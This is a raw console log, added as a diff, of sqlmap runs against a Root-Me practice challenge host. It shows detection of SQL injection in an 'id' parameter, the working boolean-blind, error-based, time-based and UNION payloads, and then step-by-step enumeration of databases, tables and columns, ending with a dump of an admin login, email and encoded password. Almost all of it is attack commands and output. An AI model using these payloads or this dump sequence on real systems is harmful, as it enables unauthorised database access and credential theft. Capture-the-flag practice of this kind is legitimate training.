@@ -1,0 +1,328 @@
+S:\04_work\BurpSuite>sqlmap.py -r C:\Users\ADMINI~1\AppData\Local\Temp\\1552811942585.req
+        ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.3.3.23#dev}
+|_ -| . [']     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 16:39:03 /2019-03-17/
+
+[16:39:03] [INFO] parsing HTTP request from 'C:\Users\ADMINI~1\AppData\Local\Temp\\1552811942585.req'
+[16:39:04] [INFO] testing connection to the target URL
+[16:39:05] [INFO] checking if the target is protected by some kind of WAF/IPS
+[16:39:05] [INFO] testing if the target URL content is stable
+[16:39:05] [INFO] target URL content is stable
+[16:39:05] [INFO] testing if GET parameter 'action' is dynamic
+[16:39:06] [INFO] GET parameter 'action' appears to be dynamic
+[16:39:06] [WARNING] heuristic (basic) test shows that GET parameter 'action' might not be injectable
+[16:39:07] [INFO] testing for SQL injection on GET parameter 'action'
+[16:39:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[16:39:11] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[16:39:12] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[16:39:14] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[16:39:16] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+[16:39:18] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+[16:39:20] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
+[16:39:20] [INFO] testing 'MySQL inline queries'
+[16:39:21] [INFO] testing 'PostgreSQL inline queries'
+[16:39:21] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
+[16:39:21] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[16:39:23] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+[16:39:25] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+[16:39:26] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
+[16:39:28] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[16:39:30] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
+[16:39:32] [INFO] testing 'Oracle AND time-based blind'
+[16:39:34] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[16:39:56] [WARNING] GET parameter 'action' does not seem to be injectable
+[16:39:56] [INFO] testing if GET parameter 'id' is dynamic
+[16:39:57] [INFO] GET parameter 'id' appears to be dynamic
+[16:39:57] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
+[16:39:58] [INFO] testing for SQL injection on GET parameter 'id'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
+[16:44:03] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[16:44:03] [WARNING] reflective value(s) found and filtering out
+[16:44:05] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="admin")
+[16:44:05] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[16:44:05] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[16:44:05] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[16:44:06] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[16:44:06] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
+[16:44:06] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
+[16:44:07] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[16:44:07] [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable
+[16:44:07] [INFO] testing 'MySQL inline queries'
+[16:44:08] [INFO] testing 'MySQL > 5.0.11 stacked queries (comment)'
+[16:44:08] [INFO] testing 'MySQL > 5.0.11 stacked queries'
+[16:44:08] [INFO] testing 'MySQL > 5.0.11 stacked queries (query SLEEP - comment)'
+[16:44:09] [INFO] testing 'MySQL > 5.0.11 stacked queries (query SLEEP)'
+[16:44:09] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
+[16:44:09] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
+[16:44:10] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
+[16:44:21] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable
+[16:44:21] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[16:44:21] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[16:44:22] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[16:44:23] [INFO] target URL appears to have 4 columns in query
+[16:44:26] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
+GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 164 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: action=members&id=1 AND 5971=5971
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: action=members&id=1 AND (SELECT 6075 FROM(SELECT COUNT(*),CONCAT(0x7178627171,(SELECT (ELT(6075=6075,1))),0x716a627671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: action=members&id=1 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: action=members&id=-8544 UNION ALL SELECT NULL,CONCAT(0x7178627171,0x5978584957435676765770754d7146467161426b7448577759637646646a44457458776c4975444b,0x716a627671),NULL,NULL-- TLgI
+---
+[16:44:35] [INFO] the back-end DBMS is MySQL
+web application technology: Nginx
+back-end DBMS: MySQL >= 5.0
+[16:44:35] [INFO] fetched data logged to text files under 'C:\Users\Administrator\AppData\Local\sqlmap\output\challenge01.root-me.org'
+
+[*] ending @ 16:44:35 /2019-03-17/
+
+
+S:\04_work\BurpSuite>sqlmap.py -r C:\Users\ADMINI~1\AppData\Local\Temp\\1552811942585.req --dbs
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.3.3.23#dev}
+|_ -| . [']     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 16:45:21 /2019-03-17/
+
+[16:45:21] [INFO] parsing HTTP request from 'C:\Users\ADMINI~1\AppData\Local\Temp\\1552811942585.req'
+[16:45:22] [INFO] resuming back-end DBMS 'mysql'
+[16:45:22] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: action=members&id=1 AND 5971=5971
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: action=members&id=1 AND (SELECT 6075 FROM(SELECT COUNT(*),CONCAT(0x7178627171,(SELECT (ELT(6075=6075,1))),0x716a627671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: action=members&id=1 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: action=members&id=-8544 UNION ALL SELECT NULL,CONCAT(0x7178627171,0x5978584957435676765770754d7146467161426b7448577759637646646a44457458776c4975444b,0x716a627671),NULL,NULL-- TLgI
+---
+[16:45:22] [INFO] the back-end DBMS is MySQL
+web application technology: Nginx
+back-end DBMS: MySQL >= 5.0
+[16:45:22] [INFO] fetching database names
+[16:45:23] [INFO] used SQL query returns 2 entries
+[16:45:23] [INFO] retrieved: 'information_schema'
+[16:45:24] [INFO] retrieved: 'c_webserveur_31'
+available databases [2]:
+[*] c_webserveur_31
+[*] information_schema
+
+[16:45:24] [INFO] fetched data logged to text files under 'C:\Users\Administrator\AppData\Local\sqlmap\output\challenge01.root-me.org'
+
+[*] ending @ 16:45:24 /2019-03-17/
+
+
+S:\04_work\BurpSuite>sqlmap.py -r C:\Users\ADMINI~1\AppData\Local\Temp\\1552811942585.req --D c_webserveur_31 --tables
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.3.3.23#dev}
+|_ -| . [,]     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+Usage: sqlmap.py [options]
+
+sqlmap.py: error: no such option: --D
+
+Press Enter to continue...
+
+S:\04_work\BurpSuite>sqlmap.py -r C:\Users\ADMINI~1\AppData\Local\Temp\\1552811942585.req -D c_webserveur_31 --tables
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.3.3.23#dev}
+|_ -| . [)]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 16:45:52 /2019-03-17/
+
+[16:45:52] [INFO] parsing HTTP request from 'C:\Users\ADMINI~1\AppData\Local\Temp\\1552811942585.req'
+[16:45:52] [INFO] resuming back-end DBMS 'mysql'
+[16:45:52] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: action=members&id=1 AND 5971=5971
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: action=members&id=1 AND (SELECT 6075 FROM(SELECT COUNT(*),CONCAT(0x7178627171,(SELECT (ELT(6075=6075,1))),0x716a627671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: action=members&id=1 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: action=members&id=-8544 UNION ALL SELECT NULL,CONCAT(0x7178627171,0x5978584957435676765770754d7146467161426b7448577759637646646a44457458776c4975444b,0x716a627671),NULL,NULL-- TLgI
+---
+[16:45:53] [INFO] the back-end DBMS is MySQL
+web application technology: Nginx
+back-end DBMS: MySQL >= 5.0
+[16:45:53] [INFO] fetching tables for database: 'c_webserveur_31'
+[16:45:54] [INFO] used SQL query returns 1 entry
+Database: c_webserveur_31
+[1 table]
++--------+
+| member |
++--------+
+
+[16:45:54] [INFO] fetched data logged to text files under 'C:\Users\Administrator\AppData\Local\sqlmap\output\challenge01.root-me.org'
+
+[*] ending @ 16:45:54 /2019-03-17/
+
+
+S:\04_work\BurpSuite>sqlmap.py -r C:\Users\ADMINI~1\AppData\Local\Temp\\1552811942585.req -D c_webserveur_31 -T member --columns
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.3.3.23#dev}
+|_ -| . [.]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 16:46:17 /2019-03-17/
+
+[16:46:17] [INFO] parsing HTTP request from 'C:\Users\ADMINI~1\AppData\Local\Temp\\1552811942585.req'
+[16:46:18] [INFO] resuming back-end DBMS 'mysql'
+[16:46:18] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: action=members&id=1 AND 5971=5971
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: action=members&id=1 AND (SELECT 6075 FROM(SELECT COUNT(*),CONCAT(0x7178627171,(SELECT (ELT(6075=6075,1))),0x716a627671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: action=members&id=1 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: action=members&id=-8544 UNION ALL SELECT NULL,CONCAT(0x7178627171,0x5978584957435676765770754d7146467161426b7448577759637646646a44457458776c4975444b,0x716a627671),NULL,NULL-- TLgI
+---
+[16:46:18] [INFO] the back-end DBMS is MySQL
+web application technology: Nginx
+back-end DBMS: MySQL >= 5.0
+[16:46:18] [INFO] fetching columns for table 'member' in database 'c_webserveur_31'
+[16:46:19] [INFO] used SQL query returns 4 entries
+[16:46:19] [INFO] retrieved: 'member_id','int(1)'
+[16:46:19] [INFO] retrieved: 'member_login','varchar(20)'
+[16:46:20] [INFO] retrieved: 'member_password','varchar(1000)'
+[16:46:20] [INFO] retrieved: 'member_email','varchar(50)'
+Database: c_webserveur_31
+Table: member
+[4 columns]
++-----------------+---------------+
+| Column          | Type          |
++-----------------+---------------+
+| member_email    | varchar(50)   |
+| member_id       | int(1)        |
+| member_login    | varchar(20)   |
+| member_password | varchar(1000) |
++-----------------+---------------+
+
+[16:46:20] [INFO] fetched data logged to text files under 'C:\Users\Administrator\AppData\Local\sqlmap\output\challenge01.root-me.org'
+
+[*] ending @ 16:46:20 /2019-03-17/
+
+
+S:\04_work\BurpSuite>sqlmap.py -r C:\Users\ADMINI~1\AppData\Local\Temp\\1552811942585.req -D c_webserveur_31 -T member -C member_id,member_email,member_login,member_password --dump
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.3.3.23#dev}
+|_ -| . [.]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 16:46:58 /2019-03-17/
+
+[16:46:58] [INFO] parsing HTTP request from 'C:\Users\ADMINI~1\AppData\Local\Temp\\1552811942585.req'
+[16:46:58] [INFO] resuming back-end DBMS 'mysql'
+[16:46:58] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: action=members&id=1 AND 5971=5971
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: action=members&id=1 AND (SELECT 6075 FROM(SELECT COUNT(*),CONCAT(0x7178627171,(SELECT (ELT(6075=6075,1))),0x716a627671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: action=members&id=1 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: action=members&id=-8544 UNION ALL SELECT NULL,CONCAT(0x7178627171,0x5978584957435676765770754d7146467161426b7448577759637646646a44457458776c4975444b,0x716a627671),NULL,NULL-- TLgI
+---
+[16:46:59] [INFO] the back-end DBMS is MySQL
+web application technology: Nginx
+back-end DBMS: MySQL >= 5.0
+[16:46:59] [INFO] fetching entries of column(s) 'member_email, member_id, member_login, member_password' for table 'member' in database 'c_webserveur_31'
+[16:46:59] [INFO] used SQL query returns 1 entry
+Database: c_webserveur_31
+Table: member
+[1 entry]
++-----------+-------------------------------+--------------+----------------------------------------------------------+
+| member_id | member_email                  | member_login | member_password                                          |
++-----------+-------------------------------+--------------+----------------------------------------------------------+
+| 1         | admin@super-secure-webapp.org | admin        | VA5QA1cCVQgPXwEAXwZVVVsHBgtfUVBaV1QEAwIFVAJWAwBRC1tRVA== |
++-----------+-------------------------------+--------------+----------------------------------------------------------+
+
+[16:47:00] [INFO] table 'c_webserveur_31.member' dumped to CSV file 'C:\Users\Administrator\AppData\Local\sqlmap\output\challenge01.root-me.org\dump\c_webserveur_31\member.csv'
+[16:47:00] [INFO] fetched data logged to text files under 'C:\Users\Administrator\AppData\Local\sqlmap\output\challenge01.root-me.org'
+
+[*] ending @ 16:47:00 /2019-03-17/
+
+
+S:\04_work\BurpSuite>
